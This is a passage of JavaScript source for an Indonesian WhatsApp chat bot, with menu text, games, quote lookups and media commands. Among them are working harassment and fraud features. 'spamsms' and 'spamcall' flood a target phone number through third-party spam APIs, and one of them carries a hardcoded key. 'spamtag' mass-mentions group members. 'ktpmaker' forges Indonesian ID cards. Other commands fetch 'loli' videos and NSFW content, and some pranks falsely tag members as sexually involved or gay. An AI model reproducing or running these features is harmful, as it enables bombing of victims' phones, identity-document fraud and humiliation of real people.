│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script :
│_/\_https://github.com/Fauzibanh
│_/\_Notes : CARI SENDIRI:V
└──────────────────❒


           ║▌│█║▌│ █║▌│█│║▌║
           ║▌│█║▌│ █║▌│█│║▌║
   
            [ *POWERED BY ©REALZIBOT* ]
`
var imgs = await itsmevall.prepareMessage('0@c.us', thumb, image, { thumbnail: thumb })
            var imgCatalog = imgs.message.imageMessage
            var ctlg = await itsmevall.prepareMessageFromContent(from, {
                "productMessage": {
                    "product": {
                        "productImage": imgCatalog,
                        "productId": "4457725420906655",
                        "title": `_*ALLMENU BOT*_`,
                        "description": menu,
                        "footerText": `ALYA BOT`,
                        "currencyCode": "IDR",
                        "priceAmount1000": "26262626262626",
                        "productImageCount": 1,
                        "firstImageId": 1,
                        "salePriceAmount1000": "1000",
                        "retailerId": `${fakeyoi}`,
                        "url": "Love You All >_<"
                    },
                    "businessOwnerJid": "6289503657396@s.whatsapp.net",
                }
            }, { quoted: mek, mimetype: 'itsmevall/jpeg' })
            itsmevall.relayWAMessage(ctlg)
            break
case 'document':
if (isBanned) return reply(mess.ban)
        ptod = "6289503657396@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
tescok = `${menunya(prefix)}`
Sendbutdocument(from, tescok, "©Wa.me×Owner/alya*", fs.readFileSync('./media/Alya✓Bot.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/thumbnaildokumen.jpg'), filename:`Alya✓Bot.pdf`, pageCount: 9999999 }, [{buttonId:`!000`,buttonText:{displayText:'Hai‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nSemuanya aku mau Jujur Kalau aku itu Gay dan Lagi Pengen Sama Cowok berotot untuk jadi Pacarku, yang Berminat Bisa Chat aku yahh 😋'},type:1}], {quoted:foncevid, contextInfo: { mentionedJid: [ptod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${ucapanWaktu} - ${pushname}\nJangan Lupa Donasi Kak`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})
break
case 'credits':
if (isBanned) return reply(mess.ban)
   dtod = '6289503657396'
   dtod1 = '6281252848955'
   dtod2 = '6285815700875'
   dtod3 = '6285815700861'
   dtod4 ='6285815700875'
   var yez = `
   [ Thanks To ] :
   
 🌹 : wa.me/${dtod1.split("@")[0]}
 🌹 : wa.me/${dtod.split('@')[0]}
 🌹 : wa.me/${dtod2.split('@')[0]}
 🌹 : wa.me/${dtod3.split('@')[0]}
 🌹 : wa.me/${dtod4.split('@')[0]}
 `
     credit = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 121, "message": `${yez}`, "footerText": "hehe", "thumbnail": iye, "surface": 'CATALOG'}}, {quoted: mek})
            itsmevall.relayWAMessage(credit)
        break
case 'tovn':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})  
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await itsmevall.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						itsmevall.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
						limitAdd(sender, limit)
				break                                     
case "suit":
  if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `Pilih salah satu button untuk bermain suit`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang 😍",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case 'loliv':
       case 'lolivid':
       case 'lolivideo':
       if (isBanned) return reply(mess.ban)
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
case 'bugreport':
if (isBanned) return reply(mess.ban)
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              grupinv('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              itsmevall.sendMessage('6285815700875@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              break
case 'restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             grupinv('_Restarting Bot Success_')
break
case 'ktpmaker':
   case 'createktp':
   case 'buatktp':
case 'ktp':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)                   
if (isBanned) return reply(mess.ban)
if (args.length == 0) return reply(`◯ USAGE : ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\n────────────\n\n◯ EXAMPLE : ${prefix + command} 6281231951590|bumipertiwi|fatamorgana|MUZZA BOT|mars, 99-99-9999|belum ditemukan|jl sukarno|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/QbCC3Q7/0438dd9a28d2.jpg\n\n*NOTE : UNTUK MENJADIKAN GAMBAR ATAU IMAGE MENJADI URL BISA DENGAN CARA REPLY GAMBAR ATAU KIRIM GAMBAR DENGAN CAPTION ${prefix}imgtourl*`)
   reply(mess.wait)  
   get_args = args.join(" ").split("|")
   nik = get_args[0]
   prov = get_args[1]
   kabu = get_args[2]
   name = get_args[3]
   ttl = get_args[4]
   jk = get_args[5]
   jl = get_args[6]
   rtrw = get_args[7]
   lurah = get_args[8]
   camat = get_args[9]
   agama = get_args[10]
   nikah = get_args[11]
   kerja = get_args[12]
   warga = get_args[13]
   until = get_args[14]
   img = get_args[15]
   ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${lolkey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
   itsmevall.sendMessage(from, ini_buffer, image, {caption: 'KTPNYA DAH JADI KAK', quoted: mek })
   limitAdd(sender, limit)
  break
                    case 'distance': case 'jarak':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)                   
    if (isBanned) return reply(mess.ban)   
    if (args.length < 1) return reply(`Penggunaan ${command} tempat1|tempat2`)
    if (!q.includes("|")) return reply(`Penggunaan ${command} tempat1|tempat2`)
    fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${lolkey}&kota1=${q.split('|')[0].trim()}&kota2=${q.split('|')[1].trim()}`)
    .then((res) =>{
  let x = res.result
  let ini_txt = `Informasi Jarak dari ${q.split('|')[0].trim()} ke ${q.split('|')[1].trim()} :\n\n`
  ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
  ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
  ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
  ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
  ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
  ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
  ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
  ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
  ini_txt += `  ╭───────────────❏\n`
  ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
  ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
  ini_txt += `❍┤ Moil : ${x.moil}\n`
  ini_txt += `❍┤ Motor : ${x.motor}\n`
  ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
  ini_txt += `  ╰───────────────❏\n`
  reply(ini_txt)
  limitAdd(sender, limit)
    })
   .catch((err) => {
   reply(`Error, Mungkin Nama Kota Tidak Di Temukan`)
    })
    break
    case 'cekapikey':
if (isBanned) return reply(mess.ban)    
if (!isOwner && !mek.key.fromMe) return reply('Perintah ini hanya untuk moderator')
anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${lolkey}`)
reply(`─「 *APIKEY CEK* 」─\n\n➸ *USSERNAME :* ${anu.result.username}\n➸ *REQUEST :* ${anu.result.requests}\n➸ *TODAY :* ${anu.result.today}\n➸ *AKUN TYPE :* ${anu.result.account_type}\n➸ *EXPIRED :* ${anu.result.expired}`)
break
case 'toxic':
if (isBanned) return reply(mess.ban)
              Toxic().then(toxic => {
              reply (toxic)
})
              break
              case 't':
       titid =  `SILAHKAN PILIH DI BAWAH UNTUK MELANJUTKAN`
          
                   sendButMessage(from, titid, `crated ℎ𝑒𝑟𝑚𝑎𝑛 𝐵𝑜𝑡𝑧☕︎`, [
          {
            buttonId: `Y`,
            buttonText: {
              displayText: `Y`,
            },
            type: 1,
            
            
    },
          {
            buttonId: `N`,
            buttonText: {
              displayText: `N`,
            },
            type: 1,
          },
        ]);
            
             
              break                         
                case 'quotesanime':
                if (isBanned) return reply(mess.ban)
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${setting.lolkey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*• ${char}*\n*• ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=${setting.lolkey}`)
                     reply(get_result.result)

                   break
                   case 'quotes':
            ini_result = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
     get_result = ini_result.result
        ini_txt = `*${get_result.character} pernah berkata*\n\n`
       ini_txt += `~${get_result.quote}`
     reply(ini_txt)
     break
                    break                             
                 case 'spamtag':		
                 		if (isBanned) return reply(mess.ban)		
						if (isGroup && budy.length < 13) {
							teks = Number(args[0])
							teks1 = chan.message.extendedTextMessage.contextInfo.quotedMessage.conversation
							gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!Number(teks)) return reply('Jumlah harus berupa angka!')
if (Number(teks) >= 1000) return reply('Kebanyakan!')
	  for (let i = 0; i < teks; i++) {
	  itsmevall.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
			} else if (isGroup && budy.length > 13) {
teks = body.slice(9)
teks1 = teks.split('|')[0]
teks2 = teks.split('|')[1]
gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!teks1) teks1 = '-'
if (!Number(teks2)) return reply('Jumlah harus berupa angka!')
if (Number(teks2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < teks2; i++) {
	  itsmevall.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
						} else if (!isGroup) {
							bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(9)
						bodo1 = bodo.split('|')[0]
						bodo2 = bodo.split('|')[1]
				teks = bodo1.replace(bodom, '')
				orange = `${teks}@s.whatsapp.net`
		if (!Number(bodo2)) return reply('Jumlah harus berupa angka!')
if (Number(bodo2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < bodo2; i++) {
	  itsmevall.sendMessage(from, `@${orange.split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [orange]}})
	  }
						}			
	  break
                 case 'spamcall':
                 if (isBanned) return reply(mess.ban)
  	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length == 0) return reply(`Masukkan Nomer nya\ncontoh ${prefix}spamcall 0882XXX`)
			call = `${body.slice(11)}`
			anu = await fetchJson(`https://api.caliph71.xyz/api/spamcall?no=${call}&apikey=cq9j7Nma`, {method: 'get'})
			itsmevall.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek})
			reply("Spam Message Succes Terkirim")
			break
			case 'spamsms':{
                if (isBanned) return reply(mess.ban)
  	if (!isOwner && !mek.key.fromMe) return reply('only owner')
                if (args.length > 2) return reply(`Cara penggunaan : ${command} no hp`)
   
  
                try {
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${args[1]}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${args[1]}`)
                    reply("Success")
               } catch (err) {
                            sendMess(ownerNumber, `${command} Error:` + err)
                            reply(mess.error.api)
               }
                }
                break
			case 'telesticker': 
       case 'telestiker':
              if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
              reply(mess.wait)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              itsmevall.sendMessage(from, ini_buffer, sticker, {})
}
              break
              case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.Language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
                    break
                case 'drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
                    break
                case 'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
			case 'tahta':
			case 'hartatahta':
			if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
reply(mess.wait)
harta = await getBuffer(`https://apidhani.herokuapp.com/api/maker/harta-tahta?apikey=${dhakey}&text=${teks}`)
itsmevall.sendMessage(from, harta, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
break
				case "ngewe":
				if (isBanned) return reply(mess.ban)
            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "bisakah":
               if (isBanned) return reply(mess.ban)
                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					bisakah = args.join(" ")
					const bisa =['Bisa','Tidak Bisa','Hmmm gimana ya','Gak bisa ajg awoakwok','mana mungkin su','Bisa banget tuh, keren kayaknya']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "kapankah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                
					kapankah = args.join(" ")
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "apakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					apakah = args.join(" ")
					const apa =['Iya','Tidak','Bisa Jadi','Hmmm gimana ya']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
case "belah":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by Arasya
                 
				if (args.length < 1) return reply('mana pertanyaan nya kak?\nContoh #iyas bermain Free Fire')
					iyas = args.join(" ")
					const iya =['Bener','Salah','Bener dong','Salah!!!']
					const salah = iya[Math.floor(Math.random() * iya.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *bener atau salah '+iyas+'*\n\nJawaban : '+ salah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "bagaimanakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					bagaimanakah = args.join(" ")
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Hmmm gimana ya','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "rate":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistereded) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					rate = args.join(" ")
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "sangecek":
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw
if (!isRegistered) return reply(mess.ban)
                 
					sange = args.join(" ")
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
case "gaycek":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					gayy = args.join(" ")
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
				case "jadian":
				if (isBanned) return reply(mess.ban)
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break
					case 'ytsilver':
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(10)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   limitAdd(sender, limit)
                   break
				case 'wolf':
				if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?`, quoted: mek})
